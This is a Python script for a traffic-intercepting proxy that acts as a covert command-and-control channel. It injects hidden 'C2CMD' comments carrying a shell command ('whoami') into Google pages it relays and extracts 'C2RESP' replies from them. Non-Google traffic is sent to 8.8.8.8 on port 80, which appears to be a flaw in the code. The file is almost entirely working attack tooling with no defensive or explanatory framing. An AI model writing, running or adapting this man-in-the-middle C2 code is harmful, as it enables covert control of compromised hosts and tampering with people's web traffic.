import socket
import threading
import requests
import re
import ssl

INTERNAL_IP = "0.0.0.0"
INTERNAL_PORT = 80
TARGET_HOST = "www.google.com"

# Covert command to inject into HTML
COVERT_CMD = "whoami"

def inject_command(content):
    try:
        html = content.decode(errors="ignore")
        injection = f"<!-- C2CMD:{COVERT_CMD} -->"
        if "</body>" in html:
            html = html.replace("</body>", injection + "</body>")
        else:
            html += injection
        return html.encode()
    except Exception:
        return content

def extract_response(content):
    try:
        html = content.decode(errors="ignore")
        match = re.search(r'<!-- C2RESP:(.*?) -->', html, re.DOTALL)
        if match:
            print(f"[+] Covert Response Extracted: {match.group(1).strip()}", flush=True)
    except Exception:
        pass

def fetch_tls(host, path):
    """Perform HTTPS request to Google and return raw content + headers."""
    context = ssl.create_default_context()
    with socket.create_connection((host, 443)) as raw_sock:
        with context.wrap_socket(raw_sock, server_hostname=host) as tls_sock:
            req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            tls_sock.sendall(req.encode())
            response = b""
            while True:
                data = tls_sock.recv(4096)
                if not data:
                    break
                response += data
    return response

def handle_client(client_socket):
    try:
        request = client_socket.recv(4096)
        if not request:
            client_socket.close()
            return

        # Decode HTTP request
        request_text = request.decode('utf-8', errors='replace')

        # Intercept Google HTTP requests
        if request_text.startswith(('GET ', 'POST ')) and f"Host: {TARGET_HOST}" in request_text:
            print("[+] Intercepted Google HTTP request", flush=True)

            # Extract path
            first_line = request_text.split('\r\n')[0]
            path = first_line.split(' ')[1] if len(first_line.split(' ')) > 1 else '/'

            # Perform TLS request to Google
            raw_response = fetch_tls(TARGET_HOST, path)

            # Split headers/body
            if b"\r\n\r\n" in raw_response:
                header, body = raw_response.split(b"\r\n\r\n", 1)
            else:
                header, body = raw_response, b""

            # Inject command and extract response
            body = inject_command(body)
            extract_response(body)

            # Build final HTTP response for client
            response = header + b"\r\n\r\n" + body
            client_socket.sendall(response)
            client_socket.close()
            return

        # Otherwise, forward traffic
        print("[+] Forwarding non-Google traffic", flush=True)
        forward_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        forward_socket.connect(("8.8.8.8", 80))
        forward_socket.sendall(request)

        while True:
            chunk = forward_socket.recv(4096)
            if not chunk:
                break
            client_socket.sendall(chunk)
        forward_socket.close()
        client_socket.close()

    except Exception as e:
        print(f"[!] Error in handle_client: {e}", flush=True)
        client_socket.close()

def run_router():
    router = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    router.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    router.bind((INTERNAL_IP, INTERNAL_PORT))
    router.listen(50)
    print(f"[+] Transparent router listening on port {INTERNAL_PORT}", flush=True)
    while True:
        client_sock, addr = router.accept()
        threading.Thread(target=handle_client, args=(client_sock,), daemon=True).start()

if __name__ == "__main__":
    print("[!] RUNNING THE MAIN FUNCTION", flush=True)
    run_router()
